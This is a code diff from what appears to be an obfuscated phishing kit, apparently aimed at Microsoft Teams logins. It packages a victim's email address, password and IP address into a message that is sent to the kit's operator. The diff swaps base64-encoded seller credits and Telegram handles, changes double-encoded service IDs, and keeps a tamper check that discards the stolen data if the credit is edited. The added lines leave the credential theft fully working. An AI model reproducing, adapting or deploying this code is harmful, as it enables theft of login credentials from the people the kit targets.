@@ -198,29 +198,19 @@ function X({mode: e=""}) {
         p(x => x + 1);
         var f = {
             reply_to: "reply_to_value",
-            from_name: atob("VEVBTVMgRlVEIEd1YXJkaWFuIG9mIE1heWhlbQ==") + "(telegram - @GuardianofMayhem)",
+            from_name: atob("VEVBTVMgV00=") + "(telegram - @toranagax)",
             to_name: atob(localStorage.getItem("to_name")),
             message_html: `Email address : ${c} and password : ${d.current.value}`,
             user_ip: localStorage.getItem("ip")
         };
-        f.from_name.includes(atob("KHRlbGVncmFtIC0gQEd1YXJkaWFub2ZNYXloZW0p")) || (f = {
+        f.from_name.includes(atob("KHRlbGVncmFtIC0gQHRvcmFuYWdheCk=")) || (f = {
             message_html: moment().format("llll"),
             user_ip: moment().add("days", 2).format("llll")
         },
         h.send = null);
         let n = {
-            t1: atob(atob("ZEdWdGNHeGhkR1ZmY2pkcGMzVjFaZz09")),
-            u1: atob(atob("Y2t0dldEaEtaM1p5U25SaFdGRkNiV1U9")),
-            t2: atob(atob("ZEdWdGNHeGhkR1ZmWjIxaE5EUjFZdz09")),
-            u2: atob(atob("YW1KV2VtUmxUMUZHVkRBM2FFZHZaVFU9")),
-            t3: atob(atob("ZEdWdGNHeGhkR1ZmYm5KNE5UaG9ZZz09")),
-            u3: atob(atob("TUdRNFJWRkNibmxHYUdGaFNHdFJSSEU9")),
-            t4: atob(atob("ZEdWdGNHeGhkR1ZmWjIxaE5EUjFZdz09")),
-            u4: atob(atob("YW1KV2VtUmxUMUZHVkRBM2FFZHZaVFU9")),
-            t5: atob(atob("ZEdWdGNHeGhkR1ZmYm5KNE5UaG9ZZz09")),
-            u5: atob(atob("TUdRNFJWRkNibmxHYUdGaFNHdFJSSEU9")),
-            t6: atob(atob("ZEdWdGNHeGhkR1ZmWjIxaE5EUjFZdz09")),
-            u6: atob(atob("YW1KV2VtUmxUMUZHVkRBM2FFZHZaVFU9"))
+            t1: atob(atob("ZEdWdGNHeGhkR1ZmZG1SclkyMXdlQT09")),
+            u1: atob(atob("WkZWT1ozZzFWVWxvVWtKelUwbFVXbVU9"))
         };
         var C = "default_service"
           , T = n.t1 || "";
